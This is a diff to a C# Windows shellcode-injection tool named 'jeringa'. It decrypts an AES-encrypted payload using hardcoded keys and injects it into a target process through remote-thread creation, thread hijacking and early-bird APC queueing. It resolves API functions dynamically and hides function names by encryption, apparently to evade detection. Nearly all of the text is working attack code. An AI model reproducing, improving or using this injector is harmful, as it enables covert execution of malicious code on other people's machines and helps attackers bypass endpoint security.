@@ -13,10 +13,12 @@ namespace jeringa
     class Program
     {
         static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
-        static String password = "ricardojoserf   ";
-        static String iv = "jeringa jeringa ";
-        static String payload_aes_password = "ricardojoserf123ricardojoserf123";
-        static String payload_aes_iv = "jeringa1jeringa1";
+        // If you change these 2 values you will have to change the AES-encrypted DLL and function names
+        static String password = "ricardojoserf   "; 
+        static String iv = "jeringa jeringa "; 
+        // If you update these 2 values, update it in payloadEncryptor
+        static String payload_aes_password = "ricardojoserf123ricardojoserf123"; 
+        static String payload_aes_iv = "jeringa1jeringa1"; 
 
         [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)] public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
         [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
@@ -150,8 +152,6 @@ namespace jeringa
                 String decryptedPayload = DecryptStringFromBytes(payload_str, Encoding.ASCII.GetBytes(payload_aes_password), Encoding.ASCII.GetBytes(payload_aes_iv));
                 byte[] decryptedBytes = Convert.FromBase64String(decryptedPayload);
                 Console.WriteLine("[+] It was possible to decrypt the payload.");
-                // Console.WriteLine("\nRaw:    " + Encoding.UTF8.GetString(decryptedBytes));
-                // Console.WriteLine("\nBase64: " + Convert.ToBase64String(decryptedBytes));
                 return decryptedBytes;
             }
             catch
@@ -160,6 +160,7 @@ namespace jeringa
                 return ToByteArray(payload_str);
             }
         }
+
 
         static byte[] tryToDecryptFile(byte[] encryptedBytes)
         {
@@ -178,6 +179,7 @@ namespace jeringa
 
             }
         }
+
 
         static byte[] getPayload(String payload_str)
         {
@@ -250,21 +252,24 @@ namespace jeringa
             WriteProcessMemoryDelegate auxWriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(addrWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
             CreateRemoteThreadDelegate auxCreateRemoteThread = (CreateRemoteThreadDelegate)Marshal.GetDelegateForFunctionPointer(addrCreateRemoteThread, typeof(CreateRemoteThreadDelegate));
 
-            String processname = Process.GetProcessById(Int32.Parse(processPID)).ProcessName;
-            uint processRights = 0x0010 | 0x0400;
-            IntPtr processHandle = auxOpenProcess(processRights, false, Int32.Parse(processPID));
-            if (processHandle != INVALID_HANDLE_VALUE)
+            byte[] buf = getPayload(payload);
+
+            Process process = Process.GetProcessById(Int32.Parse(processPID));
+            String processname = process.ProcessName;
+            String owner = getProcessOwner(process);
+            IntPtr hProcess = auxOpenProcess(0x001F0FFF, false, Int32.Parse(processPID));
+
+            if (hProcess != INVALID_HANDLE_VALUE)
             {
-                Console.WriteLine("[+] Handle to process {0} ({1}) created correctly.", processPID, processname);
+                Console.WriteLine("[+] Handle to process {0} (\"{1}\" owned by \"{2}\") created correctly.", processPID, processname, owner);
             }
             else
             {
-                Console.WriteLine("[-] Error: Handle to process {0} ({1}) is NULL.", processPID, processname);
+                Console.WriteLine("[-] Error: Handle to process {0} (\"{1}\" owned by \"{2}\") is NULL.", processPID, processname, owner);
             }
 
-            IntPtr hProcess = auxOpenProcess(0x001F0FFF, false, Int16.Parse(processPID));
             IntPtr addr = auxVirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
-            byte[] buf = getPayload(payload);
+            
             auxWriteProcessMemory(hProcess, addr, buf, buf.Length, out _);
             IntPtr hThread = auxCreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
         }
@@ -296,19 +301,21 @@ namespace jeringa
             OpenThreadDelegate auxOpenThread = (OpenThreadDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenThread, typeof(OpenThreadDelegate));
 
             byte[] buf = getPayload(payload);
-            String processname = Process.GetProcessById(Int32.Parse(processPID)).ProcessName;
-            uint processRights = 0x0010 | 0x0400;
-            IntPtr processHandle = auxOpenProcess(processRights, false, Int32.Parse(processPID));
-            if (processHandle != INVALID_HANDLE_VALUE)
+
+            Process process = Process.GetProcessById(Int32.Parse(processPID));
+            String processname = process.ProcessName;
+            String owner = getProcessOwner(process);
+            IntPtr hProcess = auxOpenProcess(0x001F0FFF, false, Int32.Parse(processPID));
+
+            if (hProcess != INVALID_HANDLE_VALUE)
             {
-                Console.WriteLine("[+] Handle to process {0} ({1}) created correctly.", processPID, processname);
+                Console.WriteLine("[+] Handle to process {0} (\"{1}\" owned by \"{2}\") created correctly.", processPID, processname, owner);
             }
             else
             {
-                Console.WriteLine("[-] Error: Handle to process {0} ({1}) is NULL.", processPID, processname);
+                Console.WriteLine("[-] Error: Handle to process {0} (\"{1}\" owned by \"{2}\") is NULL.", processPID, processname, owner);
             }
 
-            IntPtr hProcess = auxOpenProcess(0x001F0FFF, false, Int16.Parse(processPID));           
             IntPtr addr = auxVirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000, 0x20); // 0x20: PAGE_EXECUTE_READ; 0x1000 = MEM_COMMIT
             auxWriteProcessMemory(hProcess, addr, buf, buf.Length, out _);
             ProcessThread hThread = Process.GetProcessById(Int16.Parse(processPID)).Threads[0];
@@ -341,6 +348,8 @@ namespace jeringa
             QueueUserAPCDelegate auxQueueUserAPC = (QueueUserAPCDelegate)Marshal.GetDelegateForFunctionPointer(addrQueueUserAPC, typeof(QueueUserAPCDelegate));
             ResumeThreadDelegate auxResumeThread = (ResumeThreadDelegate)Marshal.GetDelegateForFunctionPointer(addrResumeThread, typeof(ResumeThreadDelegate));
 
+            byte[] buf = getPayload(payload);
+
             // https://www.codeproject.com/Articles/230005/Launch-a-process-suspended
             var si = new STARTUPINFO();
             si.cb = Marshal.SizeOf(si);
@@ -358,7 +367,6 @@ namespace jeringa
 
             Console.WriteLine("[+] Process PID: " + pi.dwProcessId);
             Console.WriteLine("[+] Thread ID:   " + pi.dwThreadId);
-            byte[] buf = getPayload(payload);
             var baseAddress = auxVirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000 | 0x2000, 0x20);
             auxWriteProcessMemory(pi.hProcess, baseAddress, buf, buf.Length, out _);
             auxQueueUserAPC(baseAddress, pi.hThread, 0);
@@ -374,8 +382,8 @@ namespace jeringa
             {
                 Console.WriteLine("{0,40} | {1,10} | {2,20}", Process.GetProcessById(Int32.Parse(kvp.Key)).ProcessName, kvp.Key, kvp.Value);
             }
-
         }
+
 
         static void getHelp()
         {
@@ -546,5 +554,7 @@ namespace jeringa
                 injectShellcodeEarlyBird(process_str, payload);
             }
         }
+
     }
+
 }
